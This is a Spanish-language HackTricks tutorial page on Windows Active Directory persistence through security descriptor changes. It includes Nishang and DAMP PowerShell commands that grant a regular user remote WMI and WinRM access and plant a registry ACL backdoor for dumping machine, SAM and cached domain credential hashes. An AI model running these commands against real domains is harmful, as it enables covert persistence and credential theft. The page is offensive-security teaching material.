# Descriptores de Seguridad

{{#include ../../banners/hacktricks-training.md}}

## Descriptores de Seguridad

[From the docs](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): El Lenguaje de Definición de Descriptores de Seguridad (SDDL) define el formato que se utiliza para describir un descriptor de seguridad. SDDL utiliza cadenas ACE para DACL y SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`

Los **descriptores de seguridad** se utilizan para **almacenar** los **permisos** que un **objeto** tiene **sobre** un **objeto**. Si puedes **hacer** un **pequeño cambio** en el **descriptor de seguridad** de un objeto, puedes obtener privilegios muy interesantes sobre ese objeto sin necesidad de ser miembro de un grupo privilegiado.

Entonces, esta técnica de persistencia se basa en la capacidad de obtener cada privilegio necesario contra ciertos objetos, para poder realizar una tarea que normalmente requiere privilegios de administrador pero sin necesidad de ser administrador.

### Acceso a WMI

Puedes dar a un usuario acceso para **ejecutar WMI de forma remota** [**usando esto**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Acceso a WinRM

Otorgar acceso a **la consola PS de winrm a un usuario** [**usando esto**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Acceso remoto a hashes

Accede al **registro** y **volcar hashes** creando una **puerta trasera de Reg usando** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** para que puedas en cualquier momento recuperar el **hash de la computadora**, el **SAM** y cualquier **credencial AD** en caché en la computadora. Así que, es muy útil otorgar este permiso a un **usuario regular contra una computadora de Controlador de Dominio**:
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Consulta [**Silver Tickets**](silver-ticket.md) para aprender cómo podrías usar el hash de la cuenta de computadora de un Controlador de Dominio.

{{#include ../../banners/hacktricks-training.md}}
